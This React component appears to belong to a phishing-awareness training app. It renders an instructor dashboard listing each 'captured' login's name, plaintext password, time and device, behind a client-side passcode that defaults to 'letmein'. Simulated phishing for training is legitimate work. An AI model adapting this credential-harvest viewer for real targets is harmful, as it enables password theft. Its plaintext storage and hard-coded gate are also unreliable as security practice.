import { useEffect, useState } from 'react'
import { Link } from 'react-router-dom'
import { getCaptures, clearCaptures, usingSupabase } from '../lib/store.js'

// Instructor view: everyone who "logged in" during the exercise.
// A passcode gate keeps it out of a curious target's hands during the demo.
// (This is a soft classroom gate, not real authentication.)
const PASSCODE = import.meta.env.VITE_DASHBOARD_PASSCODE || 'letmein'

export default function Dashboard() {
  const [authed, setAuthed] = useState(false)
  const [entry, setEntry] = useState('')
  const [rows, setRows] = useState([])
  const [loading, setLoading] = useState(false)
  const [err, setErr] = useState('')

  async function load() {
    setLoading(true)
    setErr('')
    try {
      setRows(await getCaptures())
    } catch (e) {
      setErr(e.message || String(e))
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    if (authed) load()
  }, [authed])

  async function handleClear() {
    if (!confirm('Delete ALL captured entries? This cannot be undone.')) return
    await clearCaptures()
    load()
  }

  if (!authed) {
    return (
      <div className="auth-wrap">
        <form
          className="auth-card"
          onSubmit={(e) => {
            e.preventDefault()
            if (entry === PASSCODE) setAuthed(true)
            else setErr('Wrong passcode.')
          }}
        >
          <h1 className="auth-title">Instructor dashboard</h1>
          <p className="auth-sub">Enter the passcode to view captured entries.</p>
          <label>
            Passcode
            <input
              type="password"
              value={entry}
              onChange={(e) => setEntry(e.target.value)}
              autoFocus
            />
          </label>
          {err && <p className="form-error">{err}</p>}
          <button className="btn btn-primary btn-block">Open dashboard</button>
        </form>
      </div>
    )
  }

  return (
    <div className="dash">
      <header className="dash-head">
        <div>
          <h1>Captured logins</h1>
          <p className="dash-meta">
            {rows.length} {rows.length === 1 ? 'entry' : 'entries'} ·
            storage: <strong>{usingSupabase ? 'Supabase (cloud)' : 'local browser'}</strong>
          </p>
        </div>
        <div className="dash-actions">
          <button className="btn btn-ghost" onClick={load}>Refresh</button>
          <button className="btn btn-danger" onClick={handleClear}>Clear all</button>
          <Link className="btn btn-ghost" to="/">Home</Link>
        </div>
      </header>

      {err && <p className="form-error">{err}</p>}
      {loading ? (
        <p className="dash-empty">Loading…</p>
      ) : rows.length === 0 ? (
        <p className="dash-empty">No one has been caught yet. Send them the link and watch this fill up.</p>
      ) : (
        <div className="table-wrap">
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Name</th>
                <th>Password entered</th>
                <th>When</th>
                <th>Device</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((r, i) => (
                <tr key={r.id || i}>
                  <td>{i + 1}</td>
                  <td>{r.full_name}</td>
                  <td><code>{r.password}</code></td>
                  <td>{new Date(r.created_at).toLocaleString()}</td>
                  <td className="ua">{shortUA(r.user_agent)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <p className="dash-foot">
        Reminder: this data is from a consented training exercise using throwaway
        passwords. Clear it when the demo is done.
      </p>
    </div>
  )
}

function shortUA(ua = '') {
  if (/iPhone|iPad/.test(ua)) return 'iOS'
  if (/Android/.test(ua)) return 'Android'
  if (/Windows/.test(ua)) return 'Windows'
  if (/Mac/.test(ua)) return 'Mac'
  return ua.slice(0, 24)
}
